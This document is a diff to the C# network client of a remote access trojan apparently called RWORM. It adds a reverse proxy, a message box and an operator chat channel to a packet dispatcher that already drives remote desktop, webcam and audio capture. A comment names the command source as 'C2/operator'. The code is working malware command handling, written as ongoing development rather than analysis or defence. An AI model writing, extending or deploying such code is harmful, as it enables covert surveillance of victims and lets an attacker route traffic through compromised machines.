@@ -57,6 +57,8 @@ namespace RWORM.Client.Network
         private RemoteDesktop?_remoteDesktop;
         private WebcamManager? _webcamManager;
         private AudioManager?  _audioManager;
+        private ReverseProxyManager? _proxyManager;
+        private ClientChatManager?   _chatManager;
 
 
 
@@ -410,6 +412,8 @@ namespace RWORM.Client.Network
             _remoteDesktop?.Stop();
             _webcamManager?.Stop();
             _audioManager?.Stop();
+            _proxyManager?.Stop();
+            _chatManager?.Close();
 
             try { _stream?.Close(); } catch { }
 
@@ -522,6 +526,7 @@ namespace RWORM.Client.Network
                 int  pLen   = BitConverter.ToInt32(raw, 0);
 
                 byte pType  = raw[4];
+                int  pChan  = BitConverter.ToInt32(raw, 5);
 
                 if (pLen < 0 || pLen > 50 * 1024 * 1024) { lock (_recvBuffer) _recvBuffer.Clear(); return; }
 
@@ -589,7 +594,7 @@ namespace RWORM.Client.Network
 
                 lock (_recvBuffer) _recvBuffer.RemoveRange(0, totalLen);
 
-                _ = Task.Run(() => DispatchPacket(pType, plainPayload));
+                _ = Task.Run(() => DispatchPacket(pType, pChan, plainPayload));
 
             }
 
@@ -599,7 +604,7 @@ namespace RWORM.Client.Network
 
         // ── Dispatch ──────────────────────────────────────────────────────────
 
-        private async Task DispatchPacket(byte type, byte[] payload)
+        private async Task DispatchPacket(byte type, int channel, byte[] payload)
 
         {
 
@@ -787,6 +792,21 @@ namespace RWORM.Client.Network
 
 
 
+                                // ── Reverse Proxy 0x90-0x92 ─────────────────────────────────
+                case 0x90: // PROXY_START
+                case 0x91: // PROXY_DATA
+                case 0x92: // PROXY_STOP
+                    if (_proxyManager == null)
+                    {
+                        _proxyManager = new ReverseProxyManager(async (op, chan, data) =>
+                        {
+                            await SendAsync(CreatePacket(op, chan, data));
+                        });
+                        _proxyManager.Start();
+                    }
+                    _proxyManager.HandlePacket(type, channel, payload);
+                    break;
+
                 // ── Remote Desktop ─────────────────────────────────────────
 
                 case 0x80: // RD_START — payload = optional monitor index
@@ -929,6 +949,32 @@ namespace RWORM.Client.Network
                     await SendAsync(CreatePacket(0xD7, 0, Encoding.UTF8.GetBytes("{\"ok\":true}")));
                     break;
                 }
+
+                // ── MessageBox 0xD8 ─────────────────────────────────────────
+                case 0xD8: // MSGBOX_REQ — payload = json
+                {
+                    byte[] resp = MessageBoxHandler.ShowMessageBox(txt());
+                    await SendAsync(CreatePacket(0xD9, 0, resp));
+                    break;
+                }
+
+                // ── Client Chat 0xEA-0xEC ────────────────────────────────────
+                case 0xEA: // CHAT_MSG_SEND (from C2/operator)
+                {
+                    if (_chatManager == null)
+                    {
+                        _chatManager = new ClientChatManager(async msg =>
+                        {
+                            await SendAsync(CreatePacket(0xEB, 0, Encoding.UTF8.GetBytes(msg)));
+                        });
+                    }
+                    _chatManager.HandleIncomingMessage(txt());
+                    break;
+                }
+                case 0xEC: // CHAT_CLOSE
+                    _chatManager?.Close();
+                    _chatManager = null;
+                    break;
 
                 // ── Client control ─────────────────────────────────────────
 
